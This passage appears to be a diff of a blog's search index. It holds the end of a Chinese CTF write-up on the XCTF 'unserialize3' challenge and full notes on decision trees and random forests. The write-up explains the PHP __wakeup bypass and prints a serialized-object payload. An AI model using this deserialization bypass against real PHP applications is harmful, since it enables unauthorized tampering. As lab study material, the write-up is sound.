-<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
-<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
-<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
-<h3 id="魔法函数">魔法函数</h3>
-<figure>
-<img src="/images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
-<h3 id="题目分析">题目分析</h3>
-<p>访问看到<img src="/images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
-<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
-<p>code可能是XCTF类序列化再反序列化的结果</p>
-<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
-<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RandomForest</title>
-    <url>/2021/10/17/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.html</url>
-    <content><![CDATA[<h2 id="决策树">决策树</h2>
-<p>先来复习一下决策树，根据预测结果不同，决策树分为回归决策树和分类决策树。很多的决策树集成，就成为了森林。常见的算法有随机森林和GDBT。</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<p>决策树是一种树形结构每个内部分支都是基于一个属性，每个叶节点代表一种类型。其实决策树就是在将一个多维（特征个数）空间进行划分，切分，产生不同类别。</p>
-<h3 id="分类决策树">分类决策树</h3>
-<p>分类决策树本身就是通过计算信息增益，选择特征，根据特征的值的个数形成分支，剪支（还没学）。</p>
-<p><span class="math inline">\(x_i\)</span>代表某个特征的取值，<span class="math inline">\(P(x_i)\)</span>代表该类型的占比，<strong>信息熵</strong>衡量的是该特征的<strong>混乱程度</strong>，公式：</p>
-<p>​ <span class="math display">\[H(X)=-\sum_{i=1}^{n}p(x_i)log p(x_i)\]</span></p>
-<p>决策树要做的就是通过对比使用每个特征进行分支产生的信息增益--信息熵的减少程度来选择特征。</p>
-<p>参考：<a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
-<h3 id="回归决策树">回归决策树</h3>
-<h3 id="classification-and-regression-tree-cart">（classification and regression tree, CART）</h3>
-<p>这里复习一下<strong>回归和拟合的区别</strong>：</p>
-<p>回归分析：是一种统计学上分析数据的方法，目的在于了解两个或多个变量间<strong>是否相关</strong>、<strong>相关方向与强度</strong>，并建立数学模型以便观察特定变量来预测研究者感兴趣的变量。</p>
-<p>拟合：是一种把现有数据透过数学方法来代入<strong>一条数式</strong>的表示方式。</p>
-<p>回归决策树将一个内部节点中的所有数据的该特征的平均值作为预测值。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925133815973-632336899.png" alt="img" style="zoom: 50%;" /></p>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925132930783-421450240.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h2 id="随机森林算法random-forestrf">随机森林算法（random forest,RF）</h2>
-<h3 id="简介">简介</h3>
-<p>随机森林是一种基于集成学习的思想和决策树模型而产生的分类器。<strong>集成学习（Ensemble Learning）</strong>通过使用多个弱分类器，来组成一个强分类器，提高准确率。使用多个不同决策树<strong>独立</strong>的决策结果，少数服从多数的方法来分类。</p>
-<p>少数优秀的树的预测结果将会超脱于芸芸“噪音”，做出一个好的预测。将若干个弱分类器的分类结果进行投票选择，从而组成一个强分类器，这就是随机森林<strong>bagging</strong>的思想。bagging的代价是不用单棵决策树来做预测，<strong>具体哪个变量起到重要作用变得未知</strong>，所以bagging<strong>改进了预测准确率但损失了解释性</strong>。</p>
-<h3 id="决策树生成规则">决策树生成规则</h3>
-<ol type="1">
-<li>如果训练集大小为N，对于每棵树而言，随机且有放回地从训练集中的抽取N个训练样本（这种采样方式称为bootstrap sample方法），作为该树的训练集；（<strong>bootstrap sample取样方法</strong>，随机有放回）</li>
-<li>如果每个样本的特征维度为M，指定一个常数m&lt;&lt;M，随机地从M个特征中选取m个特征子集，每次树进行分裂时，从这m个特征中选择最优的；</li>
-<li>每棵树都尽最大程度的生长，并且没有剪枝过程。</li>
-</ol>
-<p><strong>解释</strong>：随机抽样可以让<strong>每个决策树使用的数据集不同</strong>，给出不同的预测结果。有放回不至于让每个决策树得到数据集中的一部分，这样的结果是<strong>片面的</strong>。</p>
-<p>两个随机：随机取样和随机取m个特征。</p>
-<h3 id="分类效果">分类效果</h3>
-<ul>
-<li>森林中任意两棵树的相关性：相关性越大，错误率越大；</li>
-<li>森林中每棵树的分类能力：每棵树的分类能力越强，整个森林的错误率越低。</li>
-</ul>
-<p>　　减小特征选择个数m，树的相关性和分类能力也会相应的降低；增大m，两者也会随之增大。所以关键问题是如何选择最优的m（或者是范围），这也是随机森林唯一的一个参数。</p>
-<h3 id="袋外错误率out-of-bag-error">袋外错误率（out of bag error）</h3>
-<p>袋外错误率主要用于选取最佳的m值。</p>
-<p>对每个样本，使用没有选择这个样本的决策树进行预测，使用少数服从多数的方法，得到预测结果。</p>
-<p>最终得到每个样本是否被正确预测，计算袋外错误率。</p>
-<h3 id="代码使用">代码使用</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">rfc = RandomForestClassifier(n_estimators=<span class="number">100</span>)<span class="comment">#树的数量</span></span><br></pre></td></tr></table></figure>
-<h2 id="参考">参考</h2>
-<p><a href="https://zhuanlan.zhihu.com/p/373879791">决策树之分类树与回归树 - 知乎 (zhihu.com)</a></p>
-<p>[<a href="https://zhuanlan.zhihu.com/p/406627649">机器学习基础复习] 随机森林(Random Forest) - 知乎 (zhihu.com)</a></p>
-<p><a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
-<p><a href="https://blog.csdn.net/cpc784221489/article/details/92085702">(12条消息) 随机森林算法详解_阿斯达克-CSDN博客_随机森林详解</a></p>
-<p>https://www.zhihu.com/question/24904495/answer/371618173</p>
-]]></content>
-      <categories>
-        <category>machine_learning</category>
-      </categories>
-      <tags>
-        <tag>model</tag>
       </tags>
   </entry>
 </search>
